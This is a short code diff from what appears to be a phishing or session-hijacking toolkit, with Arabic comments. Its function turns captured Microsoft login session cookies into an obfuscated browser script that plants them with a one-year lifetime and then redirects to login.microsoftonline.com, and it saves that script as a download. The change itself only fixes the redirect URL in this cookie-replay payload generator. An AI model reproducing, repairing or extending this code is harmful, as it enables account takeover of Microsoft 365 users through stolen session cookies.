@@ -1853,7 +1853,7 @@ function downloadCookiesScript(sessionData) {
     const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
     
     // إنشاء نص JavaScript بالتنسيق المطلوب
-    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://login.microsoftonline.com}"}();`;
+    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://login.microsoftonline.com"}();`;
     
     // إنشاء ملف نصي
     const blob = new Blob([jsCode], { type: 'text/plain' });
